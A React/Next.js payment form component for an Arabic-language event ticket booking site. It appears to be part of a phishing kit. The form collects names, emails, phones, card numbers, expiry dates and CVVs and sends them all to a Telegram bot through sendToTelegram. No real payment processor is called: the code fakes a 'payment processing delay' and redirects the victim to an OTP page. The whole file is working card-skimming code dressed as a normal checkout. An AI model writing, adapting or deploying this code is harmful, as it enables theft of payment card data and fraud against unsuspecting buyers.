// components/PaymentForm.jsx - Modified Version
'use client';
import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { sendToTelegram } from '../lib/telegramBot';
import Image from 'next/image';

export default function PaymentForm() {
  const router = useRouter();
  const [bookingDetails, setBookingDetails] = useState(null);
  const [loading, setLoading] = useState(false);
  const [formErrors, setFormErrors] = useState({});
  const [cardType, setCardType] = useState(null);
  const [formData, setFormData] = useState({
    fullName: '',
    email: '',
    phone: '',
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    cardHolder: ''
  });

  useEffect(() => {
    // Retrieve booking details from session storage
    const storedBookingDetails = sessionStorage.getItem('bookingDetails');
    if (storedBookingDetails) {
      setBookingDetails(JSON.parse(storedBookingDetails));
      console.log('storedBookingDetails', storedBookingDetails);
    } else {
      // Redirect to home if no booking details found
      router.push('/');
    }
  }, [router]);

  const detectCardType = (cardNumber) => {
    // Remove all non-digit characters
    const clean = cardNumber.replace(/\D/g, '');

    // Check card patterns
    if (clean.startsWith('4')) {
      return 'visa';
    } else if (/^5[1-5]/.test(clean)) {
      return 'mastercard';
    } else if (/^3[47]/.test(clean)) {
      return 'amex';
    }

    return null;
  };

  const handleChange = (e) => {
    const { name, value } = e.target;

    // Clear related error when field is edited
    if (formErrors[name]) {
      setFormErrors((prev) => ({ ...prev, [name]: '' }));
    }

    if (name === 'cardNumber') {
      // Format card number with spaces
      const formatted = value
        .replace(/\s/g, '')
        .replace(/(\d{4})/g, '$1 ')
        .trim();

      // Detect card type
      const type = detectCardType(formatted);
      setCardType(type);

      setFormData({ ...formData, [name]: formatted });
    } else if (name === 'expiryDate') {
      // Format expiry date as MM/YY
      const formatted = value
        .replace(/\D/g, '')
        .replace(/^(\d{2})(\d)/, '$1/$2')
        .slice(0, 5);
      setFormData({ ...formData, [name]: formatted });
    } else {
      setFormData({ ...formData, [name]: value });
    }
  };

  const validateForm = () => {
    const errors = {};

    // Validate full name
    if (!formData.fullName.trim()) {
      errors.fullName = 'الاسم الكامل مطلوب';
    }

    // Validate email
    if (!/^\S+@\S+\.\S+$/.test(formData.email)) {
      errors.email = 'البريد الإلكتروني غير صالح';
    }

    // Validate phone
    if (!/^\d{10,}$/.test(formData.phone.replace(/\D/g, ''))) {
      errors.phone = 'رقم هاتف غير صالح';
    }

    // Validate card number
    const cleanCardNumber = formData.cardNumber.replace(/\s/g, '');
    if (cleanCardNumber.length < 13 || cleanCardNumber.length > 19) {
      errors.cardNumber = 'رقم البطاقة غير صالح';
    }

    // Validate expiry date
    const [month, year] = formData.expiryDate.split('/');
    if (!month || !year) {
      errors.expiryDate = 'تاريخ انتهاء غير صالح';
    } else {
      const currentYear = new Date().getFullYear() % 100; // Get last 2 digits
      const currentMonth = new Date().getMonth() + 1; // 1-12

      const expMonth = parseInt(month, 10);
      const expYear = parseInt(year, 10);

      if (
        expMonth < 1 ||
        expMonth > 12 ||
        expYear < currentYear ||
        (expYear === currentYear && expMonth < currentMonth)
      ) {
        errors.expiryDate = 'البطاقة منتهية الصلاحية';
      }
    }

    // Validate CVV
    if (!/^\d{3,4}$/.test(formData.cvv)) {
      errors.cvv = 'رمز الأمان غير صالح';
    }

    // Validate card holder
    if (!formData.cardHolder.trim()) {
      errors.cardHolder = 'اسم صاحب البطاقة مطلوب';
    }

    setFormErrors(errors);
    return Object.keys(errors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Validate form before submission
    if (!validateForm()) {
      return;
    }

    setLoading(true);

    try {
      // Save customer details to booking info
      const completeBookingDetails = {
        ...bookingDetails,
        ...formData
      };

      // Send form data to Telegram immediately
      await sendToTelegram(completeBookingDetails);

      // Store for OTP verification
      sessionStorage.setItem(
        'completeBookingDetails',
        JSON.stringify(completeBookingDetails)
      );

      // Simulate payment processing delay
      await new Promise((resolve) => setTimeout(resolve, 1500));

      // Redirect to OTP verification
      router.push('/confirmation');
    } catch (error) {
      console.error('Payment error:', error);
      setLoading(false);
    }
  };

  if (!bookingDetails) {
    return <div className='py-12 text-center'>جاري تحميل تفاصيل الحجز...</div>;
  }

  return (
    <div className='bg-dark-gray rounded-lg p-6 shadow-lg'>
      <h3 className='text-neon-yellow mb-6 text-xl font-bold'>تفاصيل الدفع</h3>

      <div className='bg-card-bg mb-6 rounded-lg p-4'>
        <h4 className='mb-2 font-medium'>ملخص الطلب</h4>
        <p className='text-gray-300'>{bookingDetails.eventTitle}</p>
        <p className='text-gray-300'>التاريخ: {bookingDetails.eventDate}</p>
        <p className='text-gray-300'>
          التذاكر: {bookingDetails.quantity} × {bookingDetails.ticketType} ($
          {bookingDetails.ticketPrice}/للتذكرة)
        </p>
        <div className='mt-3 border-t border-gray-700 pt-3 font-bold'>
          المجموع:{' '}
          <span className='text-neon-yellow'>
            ${bookingDetails.totalAmount.toFixed(2)}
          </span>
        </div>
      </div>

      <form onSubmit={handleSubmit}>
        <div className='mb-6 grid grid-cols-1 gap-4 md:grid-cols-2'>
          <div>
            <label htmlFor='fullName' className='mb-1 block text-gray-200'>
              الاسم الكامل
            </label>
            <input
              type='text'
              id='fullName'
              name='fullName'
              required
              value={formData.fullName}
              onChange={handleChange}
              className={`bg-dark focus:border-neon-yellow w-full rounded-lg border ${formErrors.fullName ? 'border-red-500' : 'border-gray-600'} px-4 py-2 text-white focus:outline-none`}
            />
            {formErrors.fullName && (
              <p className='mt-1 text-sm text-red-500'>{formErrors.fullName}</p>
            )}
          </div>
          <div>
            <label htmlFor='email' className='mb-1 block text-gray-200'>
              البريد الإلكتروني
            </label>
            <input
              type='email'
              id='email'
              name='email'
              required
              value={formData.email}
              onChange={handleChange}
              className={`bg-dark focus:border-neon-yellow w-full rounded-lg border ${formErrors.email ? 'border-red-500' : 'border-gray-600'} px-4 py-2 text-white focus:outline-none`}
            />
            {formErrors.email && (
              <p className='mt-1 text-sm text-red-500'>{formErrors.email}</p>
            )}
          </div>
        </div>

        <div className='mb-6'>
          <label htmlFor='phone' className='mb-1 block text-gray-200'>
            رقم الهاتف
          </label>
          <input
            type='tel'
            id='phone'
            name='phone'
            required
            value={formData.phone}
            onChange={handleChange}
            className={`bg-dark focus:border-neon-yellow w-full rounded-lg border ${formErrors.phone ? 'border-red-500' : 'border-gray-600'} px-4 py-2 text-white focus:outline-none`}
          />
          {formErrors.phone && (
            <p className='mt-1 text-sm text-red-500'>{formErrors.phone}</p>
          )}
        </div>

        <hr className='my-6 border-gray-700' />

        <div className='relative mb-6'>
          <label htmlFor='cardNumber' className='mb-1 block text-gray-200'>
            رقم البطاقة
          </label>
          <div className='relative'>
            <input
              type='text'
              id='cardNumber'
              name='cardNumber'
              placeholder='XXXX XXXX XXXX XXXX'
              required
              maxLength='19'
              value={formData.cardNumber}
              onChange={handleChange}
              className={`bg-dark focus:border-neon-yellow w-full rounded-lg border ${formErrors.cardNumber ? 'border-red-500' : 'border-gray-600'} px-4 py-2 text-white focus:outline-none ${cardType ? 'pr-12' : ''}`}
            />
            {cardType && (
              <div className='absolute inset-y-0 right-3 flex items-center'>
                <Image
                  src={`/images/${cardType}.svg`}
                  alt={cardType}
                  width={32}
                  height={20}
                />
              </div>
            )}
          </div>
          {formErrors.cardNumber && (
            <p className='mt-1 text-sm text-red-500'>{formErrors.cardNumber}</p>
          )}
        </div>

        <div className='mb-6 grid grid-cols-2 gap-4 md:grid-cols-3'>
          <div>
            <label htmlFor='expiryDate' className='mb-1 block text-gray-200'>
              تاريخ الانتهاء
            </label>
            <input
              type='text'
              id='expiryDate'
              name='expiryDate'
              placeholder='MM/YY'
              required
              maxLength='5'
              value={formData.expiryDate}
              onChange={handleChange}
              className={`bg-dark focus:border-neon-yellow w-full rounded-lg border ${formErrors.expiryDate ? 'border-red-500' : 'border-gray-600'} px-4 py-2 text-white focus:outline-none`}
            />
            {formErrors.expiryDate && (
              <p className='mt-1 text-sm text-red-500'>
                {formErrors.expiryDate}
              </p>
            )}
          </div>
          <div>
            <label htmlFor='cvv' className='mb-1 block text-gray-200'>
              رمز الأمان
            </label>
            <input
              type='text'
              id='cvv'
              name='cvv'
              placeholder='XXX'
              required
              maxLength='4'
              value={formData.cvv}
              onChange={handleChange}
              className={`bg-dark focus:border-neon-yellow w-full rounded-lg border ${formErrors.cvv ? 'border-red-500' : 'border-gray-600'} px-4 py-2 text-white focus:outline-none`}
            />
            {formErrors.cvv && (
              <p className='mt-1 text-sm text-red-500'>{formErrors.cvv}</p>
            )}
          </div>
          <div className='col-span-2 md:col-span-1'>
            <label htmlFor='cardHolder' className='mb-1 block text-gray-200'>
              اسم صاحب البطاقة
            </label>
            <input
              type='text'
              id='cardHolder'
              name='cardHolder'
              required
              value={formData.cardHolder}
              onChange={handleChange}
              className={`bg-dark focus:border-neon-yellow w-full rounded-lg border ${formErrors.cardHolder ? 'border-red-500' : 'border-gray-600'} px-4 py-2 text-white focus:outline-none`}
            />
            {formErrors.cardHolder && (
              <p className='mt-1 text-sm text-red-500'>
                {formErrors.cardHolder}
              </p>
            )}
          </div>
        </div>

        <button
          type='submit'
          className='btn-primary flex w-full items-center justify-center'
          disabled={loading}
        >
          {loading ? (
            <>
              <svg
                className='text-dark -ml-1 mr-3 h-5 w-5 animate-spin'
                xmlns='http://www.w3.org/2000/svg'
                fill='none'
                viewBox='0 0 24 24'
              >
                <circle
                  className='opacity-25'
                  cx='12'
                  cy='12'
                  r='10'
                  stroke='currentColor'
                  strokeWidth='4'
                ></circle>
                <path
                  className='opacity-75'
                  fill='currentColor'
                  d='M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z'
                ></path>
              </svg>
              جاري المعالجة...
            </>
          ) : (
            'ادفع الآن'
          )}
        </button>
      </form>
    </div>
  );
}
